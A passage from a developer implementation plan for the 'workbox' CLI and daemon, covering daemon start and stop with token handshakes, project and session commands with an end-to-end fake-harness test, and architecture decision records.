`/api/health` with that pid during this invocation (SIGTERM, then SIGKILL 2 s later) and then removes `daemon.json` and the lock; a pid that did not answer is reported and never killed, because after a crash the number may belong to another process (re-review Minor 12); `workbox [--no-open] [--harness …]` reads `daemon.json`: when the pid is alive, health answers and `health.pid` equals the recorded pid, it compares the protocol major (`protocolMajor`) and exits 1 with `cli_start_protocol_mismatch` on a mismatch, proves the bearer with `GET /api/summary` (a 401 → `cli_start_stale_file`, exit 1: the file belongs to another daemon) and attaches; otherwise it removes the stale file and spawns the daemon, then polls every 100 ms up to `START_TIMEOUT_MS` (10 000) for a `daemon.json` whose `pid` is the child's and a healthy `/api/health`, and on timeout prints `cli_start_timeout` naming `<home>/logs/daemon.log` (the detached child's only output) and exits 1; in both cases it mints a one-time token through `POST /api/admin/one-time-token` and prints the summary with `http://127.0.0.1:<port>/?token=<one-time>`, opening it through `open` unless `--no-open` (injected, so tests record the URL instead of opening a browser).
- Fixes applied: I2 (attach proves the bearer), I9 (spawn and handshake), Minor 6 (ADR 0004), Minor 25, 26 (`stop` fallback); re-review Minors 12 and 13.

- [ ] **Step 1: Failing tests**

`client.test.ts` against the in-process server of Task 12: `command` returns a parsed `ack`, an `error` frame keeps its code, a 401 becomes `WorkboxError('unauthorized')`. `start.test.ts` and `status-stop.test.ts` spawn the CLI through `process.execPath`, set `WORKBOX_HOME` to a `mkdtemp` directory and `WORKBOX_HARNESS=fake`, use 30 s deadlines, always stop the daemon in `afterEach` and remove the directory with `maxRetries`; `status` exits 1 with "not running" before a daemon exists and prints the counts after `project add` in Task 16's test (here: zero counts); `stop` removes `daemon.json` and the lock within the timeout. A start timeout is provoked by holding the lock in the test process before running the default command: it exits 1 and the message names the log file. The protocol-mismatch case uses a stub `Bun.serve` on `127.0.0.1` whose `/api/health` answers with `protocolVersion: '99.0.0'` and the test process's own pid, named by a `daemon.json` the test writes; the default command must exit 1 with `cli_start_protocol_mismatch` and spawn nothing.

- [ ] **Step 2: Implement, check, commit**

`pnpm run check`, then:

```bash
git add apps/cli packages/i18n pnpm-workspace.yaml docs/adr knip.jsonc pnpm-lock.yaml
git commit -s -m "feat(cli): start, attach, stop and inspect the daemon"
```

---

### Task 16: CLI: project and session commands, end-to-end run with the fake harness

**Files:**
- Create: `apps/cli/src/commands/project.ts` (`project add <path>`, `project ls`), `apps/cli/src/commands/session.ts` (`session new --project <id> --branch <name> [--employee <id>] [--title <text>] "<prompt>"`, `session ls [--project <id>] [--archived]`, `session stop <id>`), `apps/cli/src/output/table.ts` (plain aligned text; every command prints JSON with `--json`), `apps/cli/src/output/errors.ts` (maps an `error` frame to `cli_error_code_<code>` and exit 1)
- Create: tests `apps/cli/test/table.test.ts`, `apps/cli/test/project-session.test.ts` (the end-to-end run)
- Modify: `apps/cli/src/commands/main.ts`, `packages/i18n/messages/{en,cs}.json` (table headers `cli_project_header_*`, `cli_session_header_*`, messages `cli_project_added`, `cli_session_created`, `cli_session_stopped`, `cli_session_no_daemon`, and `cli_error_code_<code>` for each of the ten error codes; keys for `error.type` of spec 10.3 arrive with the UI in plan 3, Decision 16), `README.md` (a "Commands" section listing every command of spec section 7.4 that exists now, marking `auth` and `export` as planned, documenting `WORKBOX_HARNESS`, `WORKBOX_FAKE_SCENARIO`, that `status` exits 1 when no daemon runs, and how to opt a project into `ANTHROPIC_API_KEY` passthrough), `project-words.txt` (`localised` if used)

**Interfaces:**
- Consumes: `POST /api/command` from Task 12 through `createDaemonClient`, `parseCommandResult` from `protocol`.
- Produces: `project add <path>` resolves the path with `path.resolve` in the CLI (the detached daemon runs elsewhere) and sends `project.register`, printing `cli_project_added` with the id or `{ projectId }`; `project ls` sends `project.list` and prints `id`, `name`, `path`, `defaultBranch` or the JSON; `session new` sends `session.create` with the title from `--title` or the prompt's first line truncated to `TITLE_MAX_LENGTH` (60) characters, printing the session id or `{ sessionId, employeeId }`; `session ls` sends `session.list` and prints `id`, `status`, `title`, `branch`, `lastSeq`, `pendingRequest` or the JSON (`Session[]` as the daemon returns it); `session stop <id>` sends `session.stop`. Every command generates `commandId` with `crypto.randomUUID()`, exits 1 with the localised message of an `error` frame, and prints `cli_session_no_daemon` with exit 1 when `daemon.json` is missing (no auto-start from these commands).
- Fixes applied: C2, I1 (j), I9 (acceptance test), Minor 8, 14, 17 (`cli_error_code_*`), 23.

- [ ] **Step 1: Failing tests**

`table.test.ts` pins the aligned output for two rows and the JSON alternative. `project-session.test.ts` is the acceptance test of this plan: temp home, temp git repository from `@workbox/sandbox-host/testing` (with its git env), `serve --port 0` spawned in the background with `WORKBOX_HARNESS=fake` and `WORKBOX_FAKE_SCENARIO=permission-then-complete`; `project add <repo>` → parse the id from `--json`; `session new --project <id> --branch main "Build it" --json` → session id; poll `session ls --json` every 250 ms with a 30 s deadline until the session is `waiting_for_permission` and read `pendingRequest.requestId`; `POST /api/command` with `permission.resolve { decision: 'allow' }` through `createDaemonClient` using the recorded bearer; poll until `completed`; assert `lastSeq` grew; `POST /api/command { type: 'session.search', query: <a word from the scenario's message> }` finds the message; `session stop <id>` → `stopped`; `status --json` shows `done: 0` and `attention: 1`; `stop`; the home directory removed with `maxRetries` after the daemon has exited. It must pass on all three CI runners (git is installed on every GitHub runner; the helper sets `GIT_CONFIG_GLOBAL` and `GIT_CONFIG_NOSYSTEM`).

- [ ] **Step 2: Implement**

Commands share `commonArgs` from Task 14 and `createDaemonClient` from Task 15. Text output uses `writeLine` from `apps/cli/src/output/stdout.ts`; logs go to stderr, so `--json` stays parseable.

- [ ] **Step 3: Check and commit**

`pnpm run check`, then:

```bash
git add apps/cli packages/i18n README.md project-words.txt
git commit -s -m "feat(cli): add project and session commands with an end-to-end fake-harness run"
```

---

### Task 17: Decision records, developer experience and the plan index

**Files:**
- Modify: `docs/adr/0003-append-only-event-log-as-the-source-of-truth.md` (amendment: `bun:sqlite` directly with embedded SQL migrations instead of Drizzle, superseding spec sections 3 and 4.2 on this point; FTS5 asserted at start-up and the LIKE fallback dropped; projections and the `project_id` routing column written in the append transaction; the store notifies subscribers after each commit)
- Create: `docs/adr/0012-localhost-protocol-with-token-exchange-and-websocket-tickets.md` (MADR: context; decision covering one-time token with a 5-minute expiry → bearer held by browser and CLI, the bearer itself in owner-only `daemon.json` with the Windows permissions caveat, 30 s single-use tickets, `Origin` and `Host` checks with `allowedOrigins` for development (plan 3's Vite proxy must set `changeOrigin: true`, or the `Host` check answers 403), `POST /api/command` as the CLI transport with the HTTP status mapping and the two list commands added to spec 7.2, pub/sub topics `events:all`, `events:project:<id>`, `events:global`, `transient:*`, paged backfill with buffering and `closeOnBackpressureLimit`, the state-machine amendments of Decision 12, the `pendingRequest` projection field, the three shape deviations of Decision 19 (errors by rejection, `prepared` on `start()`, `PreparedWorkspace`) and the worktree cleanup of Decision 18; consequences, including that no client can be revoked on its own)
- Modify: `apps/cli/package.json` (`dev` script `bun run --watch src/main.ts serve --port 4820 --harness fake --allowed-origin http://localhost:5173`, using the flag Task 14 added; the root `dev` script already runs `turbo run dev`), `docs/adr/0005-…md` (the tag sentence now reads that `protocol`, `i18n`, `observability`, `core`, `process`, `adapter` (`store-sqlite`, `harness-fake`, `sandbox-host`, `server`), `app-web` and `app-cli` have packages today while `sim` and `render` still have none, and the nested-config sentence lists `packages/protocol`, `packages/core`, `packages/sandbox-host` and `packages/server`), `docs/superpowers/plans/README.md` (plan 2 row: in review → merged at PR time; a note that the plan closes spec open questions 5 and 6 as Decision 14 says), `CONTRIBUTING.md` (how to run the daemon with the fake harness, `WORKBOX_FAKE_SCENARIO`, where scenarios live, the `process` package in the package rules), `project-words.txt` (words the ADR prose needs)

- [ ] **Step 1: Write, check, commit**

`pnpm run check` (markdownlint and cspell cover the ADRs and the README), then:

```bash
git add docs/adr apps/cli docs/superpowers/plans/README.md CONTRIBUTING.md project-words.txt
git commit -s -m "docs: record the storage access and localhost protocol decisions for the daemon core"
```
